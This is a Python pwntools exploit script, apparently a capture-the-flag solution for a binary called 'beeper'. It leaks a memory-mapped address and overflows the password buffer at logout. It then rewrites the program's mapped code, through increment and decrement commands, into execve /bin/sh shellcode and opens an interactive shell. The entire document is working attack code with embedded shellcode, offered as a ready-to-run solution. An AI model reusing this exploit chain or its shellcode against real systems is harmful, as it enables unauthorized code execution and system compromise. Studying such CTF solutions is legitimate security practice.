#!/usr/bin/env python

from pwn import *
import binascii

context.log_level = "debug"

elf = "./beeper"
ENV = {"LD_PRELOAD":"./libc.so.6"}

password = "\x86\x13\x81\x09\x62\xff\x44\xd3\x3f\xcd\x19\xb0\xfb\x88\xfd\xae\x20\xdf"

shellcode = \
"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
mmap_code = \
"686f6420018134240101010148b8757920612070686f5048b8616e206e6f7420625048b865722c796f7520635048b842616420" + \
"6861636b506a01586a015f6a235a4889e60f05c9c3"
mmap_code = binascii.a2b_hex(mmap_code)

inc = "m"
dec = "u"
nop = "h"

p = process(elf)

def auth():
    p.recvuntil("password:\n")

    payload = password
    payload += p8(0)*(0x71-len(payload))
    p.sendline(payload)

def show(idx):
    p.recvuntil("choice>>")
    p.sendline("1")
    p.recvuntil("number:")
    p.sendline(str(idx))

def remove(idx):
    p.recvuntil("choice>>")
    p.sendline("2")
    p.recvuntil("which to remove?")
    p.sendline(str(idx))

def buy():
    p.recvuntil("choice>>")
    p.sendline("3")

def logout(pwd):
    p.recvuntil("choice>>")
    p.sendline("4")
    p.recvuntil("password:")
    p.sendline(pwd)


auth()

remove(2)
remove(1)
show(1)

p.recvuntil("number:")
mmap_addr = u64(p.recv(8))
log.info("mmap_addr: "+hex(mmap_addr))

convert = ""

for i in range(0x12):
    diff = ord(shellcode[i])-ord(mmap_code[i])
    if(diff > 0):
        convert += diff*inc+nop
    elif(diff == 0):
        convert += nop
    else:
        convert += (-(diff))*dec+nop

payload = password
payload += p8(0)*(0x68-len(payload))
payload += p64(mmap_addr)
payload += convert
payload += p8(0)*(0x7a0-len(payload))

logout(payload)

convert = ""

for i in range(0x9):
    diff = ord(shellcode[i+0x12])-ord(mmap_code[i+0x12]) 
    if(diff > 0):
        convert += diff*inc+nop
    elif(diff == 0):
        convert += nop
    else:
        convert += (-(diff))*dec+nop

convert += ord(mmap_code[len(shellcode)])*dec

payload = password
payload += p8(0)*(0x68-len(payload))
payload += p64(mmap_addr+0x12)
payload += convert
payload += p8(0)*(0x7a0-len(payload))

logout(payload)
buy()

p.interactive()
